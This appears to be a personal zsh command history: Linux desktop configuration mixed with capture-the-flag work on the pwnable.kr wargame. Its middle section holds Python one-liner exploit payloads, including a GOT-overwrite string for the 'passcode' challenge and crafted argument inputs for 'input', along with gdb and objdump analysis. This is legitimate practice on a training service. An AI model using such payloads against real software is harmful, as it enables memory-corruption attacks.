hx .zsh
mkdir -p ~/.config/spaceship.zsh
cd ~/.config/spaceship.zsh
rm -r ~/.config/spaceship.zsh
cd 
touch spaceshiprc.zsh
hx spaceship
hx ~/.zsh
hx spaceshiprc.zsh
hx $ZSH/themes
SPACESHIP_PROMPT_ADD_NEWLINE=false
SPACESHIP_PROMPT_SEPARATE_LINE=false
ls .zsh
cd .zs
cat spaceshiprc.zsh
cat .zshrc
echo $SPACESHIP_CONFIG
cat /home/derek/.zsh/themes/spaceshiprc.zsh
cat ~/.zshrc;
cat spaceshiprc.zsh >> ~/.zshrc && rm spaceshiprc.zsh
rm -r ~/.zsh/themes/spaceship-prompt
y
yes
dnf install starship
sudo dnf copr enable atim/starship
sudo dnf install starship
hx something
hx ~/.config/starship.toml
rm ~/.config/starship.toml
dnf remove starship
sudo dnf remove starship
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git
cd .zsh
asd
aa
cd themes
cd Documents
  diff /tmp/.zshrc.VZJNX7OWIW ~/.zshrc\

hx ~/.zshrc
\

p10k configure
for i in {0..255}; do print -Pn "%K{$i}  %k%F{$i}${(l:3::0:)i}%f " ${${(M)$((i%6)):#3}:+$'\n'}; done
hx ~/.p10k.zsh
echo -e "\033]11;#FF0000\007"\

echo -e "\033]11;##444444\
\007"\

echo -e "\033]11;#444444\007"\

echo -e "\033]11;#1c1c1e\007"\

locate helix/config.toml
locate helix
locate config.toml
hx .config/helix/config.toml
hx .config/alacritty/alacritty.yml
cd pfetch-master
./pfetch
mv  pfetch /usr/local/bin
sudo mv pfetch /usr/local/bin
rpm -qa
sudo rpm --rebuilddb
sudo dnf remove rust
sudo dnf install rust cargo
cargo install pfetch
rm /usr/local/bin/pfetch
sudo rm /usr/local/bin/pfetch
sudo dnf remove neofetch
sudo dnf install pfetch
cd /usr/local/bin
cd yo
cd ~
sudo su
time pfetch
time hx
sudo ~/Downloads/OpenRGB_0.8_x86_64_fb88964.AppImage
dnf install ./discord-0.0.27.deb
sudo dnf install ./discord-0.0.27.deb
flatpak
flatpak -g
flatpak -h
flatpak info
flatpak info discord
flatpak list
sudo dnf remove discord
flatpak install discord
./Downloads/OpenRGB_0.8_x86_64_fb88964.AppImage
sudo ./Downloads/OpenRGB_0.8_x86_64_fb88964.AppImage
bash
time zsh
time zsh "exit"
time echo exit | zsh
time echo "exit" | zsh
xrandr
xrandr --output eDP-1 --gamma 1.5:1.5:1.5
xrandr --output eDP-1 --gamma 3.5:3.5:3.5
xrandr --output eDP-1 --gamma 2.5:2.5:2.5
xrandr --output eDP-1 --gamma 1:1:1
dnf install chrome
sudo dnf install chrome
flatpak install chrome
zle -al
zle -al | grep word
hx
nautilus
dnf install kitty
sudo dnf install kitty
kitty
moo
sudo dnf remove kitty
sudo dnf install neofetch
neofetch
pfetch
echo "My NVIDIA driver version is '${nv_version}'."
sudo dnf install nvidia-smi
quit
hx /etc/dnf/dnf.conf
sudo hx /etc/dnf/dnf.conf
typescript
tsc -v
make --version
sudo dnf install gnome-shell-extension-pop-shell xprop
sudo piper
ratbagd --verbose=raw
systemctl stop ratbag
sudo ratbagd --verbose=raw
cat
ratbagd --version
piper --version
piper
uname -srmo
systemctl status ratbagd.service
sudo service ratbagd restart
systemctl stop ratbagd
systemctl restart ratbagd
systemctl status ratbagd
s
hx .p10k.zsh
zsh
clear
cava -p ~/.config/cava/config
hx ./cava/config
cd cava
cd .config/cava
file config
cd config
hx config
hx .zshrc
nvidia-smi
locate cava
find / -name cava 2>/dev/null
cat ~/.config/cava/config
hx ~/.config/cava/config
locate alacritty
hx /home/derek/.config/alacritty/alacritty.yml
cava-nc
sudo dnf install ncurses
btop
scp -P 2222 passcode@pwnable.kr passcode
scp -P 2222 passcode passcode@pwnable.kr
scp -P 2222  passcode@pwnable.kr
scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode* ~/
scp -P 2222 passcode@pwnable.kr:~/passcode ~/
scp -P 2222 passcode@pwnable.kr:~/passcode.c ~/
mkdir ctf
mv passcode* ctf/
cd ctf
mkdir pwnable
mv passcode* pwnable
cd pwnable
yo
gdb
dnf debuginfo-install glibc-2.37-4.fc38.i686
sudo dnf debuginfo-install glibc-2.37-4.fc38.i686
cat passcode.c
man 2 scanf
man 1 scanf
man 3 scanf
man 4 scanf
man 5 scanf
man 6 scanf
man 7 scanf
man 8 scanf
man scanf
man sscanf
hx passcode.py
fg 
fg 1
fg 0
fg
fg 2
fg %2
kill %1
kill %3
jobs
python passcode.py | ./passcode
python2 -c "print 'A'*96 + '\x04\xa0\x04\x08' + '134514147'"
man rand
man 2 rand
man 1 rand
man 3 rand
python2 -c "print int('A')"
python -c "print(int('A'))"
python -c "print(int("A"))"
python -c "print(ord("A"))"
python -c "print(ord('A'))"
python2 -c "print 'A '* 63" | ./input
./input lasjkd
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d'" | ./input
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d'"
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)"
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)" | ./input
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)" | wc
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)" | wc -l
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)" | wc -w
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)" | wc -c
python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-63)" | wc -c
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-63)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-62)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-61)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-67)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-68)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-69)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-70)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-64)")
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-66)")
./modinput
./input $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)")
./modinput $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65")
./modinput $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-64)")
./modinput $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)")
./modinput hello???
./modinput hello\?\?\?
gdb ./modinput
./modinput $(python2 -c "print 'A '* 63 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-64")
./modinput $(python2 -c "print 'A '* 64 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-63)")
./modinput $(python2 -c "print 'A '* 64 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-64)")
./modinput $(python2 -c "print 'A '* 64 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-65)")
./modinput $(python2 -c "print 'A '* 65 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-66)")
./modinput $(python2 -c "print 'A '* 65 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-67)")
./modinput $(python2 -c "print 'A '* 64 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-67)")
gcc modinput.c -o modinput
./modinput $(python2 -c "print 'A '* 64 + '\x00'+ ' ' + '\x20\x0a\x0d' + ' B'*(100-66)")
./modinput $(python2 -c "print 'A '* 64 + '\x00' + '\x20\x0a\x0d' + ' B'*(100-66)")
cava
mv rust-analyzer-aarch64-unknown-linux-gnu ~/.cargo/bin/
cd ~/.cargo/bin
chmod +x rust-analyzer-aarch64-unknown-linux-gnu
mv rust-analyzer-aarch64-unknown-linux-gnu rust-analyzer
rust-analyzer
file rust-analyzer
hx random.c
hx input
mkdir /mnt/Ubuntu
cd /mnt/Ubuntu
fdisk -k
fdisk -l
sudo fdisk -l
mount /dev/nvme1n1p2 .
sudo mount /dev/nvme1n1p2 .
ls -la
sudo mount /dev/nvme1n1p2 /mnt/Ubuntu
cd Ubuntu
cd home
cd derek
cd CTFs
cd picoCTF
cd ..
cd pwnable.kr
ls -l
cp passcode.py ~/ctf/pwnable/
umount /dev/nvme1n1p2
cd /
sudo umount /dev/nvme1n1p2
cd ~/ctf/pwnable
cat passcode.0
cat passcode.py
python2
where python
where python3
ls /usr/bin/
ls /usr/bin/ | grep python
file python3
file $(where python)
file $(where python3.11)
file $(where python3)
python passcode.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAج�ܬ�%
passcode
./passcode
python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
sudo dnf update
sudo dnf install python2
python --version
python3 --version
python2 --version
python2 -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
python2 -c "print 'A'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
gdb ./passcode
objdump -D ./passcode
objdump -D ./passcode | less
ssh passcode@pwnable.kr -p2222
scp random@pwnable.kr:~/passcode* .
scp -P 2222 random@pwnable.kr:~/passcode* .
scp -P 2222 random@pwnable.kr:~/passcode .
scp -P 2222 random@pwnable.kr:~/\{random, random.c\} ..
scp -P 2222 random@pwnable.kr:~/\{random, random.c\} .
scp -P 2222 random@pwnable.kr:~/\{random,random.c\} .
scp -P 2222 random@pwnable.kr:~/{random,random.c} .
./random
gcc --version
sudo dnf install pylsp clang
sudo dnf install pylsp clangd
sudo dnf install llvm
sudo dnf install clang-tools
sudo dnf install clangd
clang --version
rustup component add rust-analyzer
rust --version
sudo dnf install rust
cargo --version
sudo dnf install clang-tools-extra
clangd
hx --health
hx pseudo_breaker.c
gcc pseudo_breaker.c pseudo_breaker
./pseudo_breaker | ./random
ld --version
echo $LD_LIBRARY_PATH\

sudo dnf install libc6
sudo dnf install libc
rpm -q glibc
ldd pseudo_breaker.c
gcc pseudo_breaker.c -o pseudo_breaker
ldd pseudo_breaker
dnf provides lib6
dnf provides libc6
dnf provides libc6.so
dnf provides /usr/lib64/libc6.so
dnf provides /usr/lib64/libc6
dnf provides '*/libc6'
dnf provides '*/libc6.*'
dnf provides \*/libc6.\*
dnf provides \*/libc6
setopt noglob
dnf provides */libc6
glibc
sudo dnf install glibc
locate libc.a
sudo dnf install glibc-static
gcc -static pseudo_breaker.c -o pseudo_breaker
scp -P 2222 ./pseudo_breaker random@pwnable.kr:/tmp/
ssh random@pwnable.kr -p2222
ssh input2@pwnable.kr -p2222
scp -P 2222 input2@pwnable.kr:~/inpu* .
ls
hx input.c
man strcmp
cd Downloads
tar -xvf gcm-linux_amd64.2.0.935.tar.gz -C /usr/local/bin
sudo tar -xvf gcm-linux_amd64.2.0.935.tar.gz -C /usr/local/bin
ls /usr/local/bin
git-credential-manager configure
export GCM_CREDENTIAL_STORE=secretservice
exit
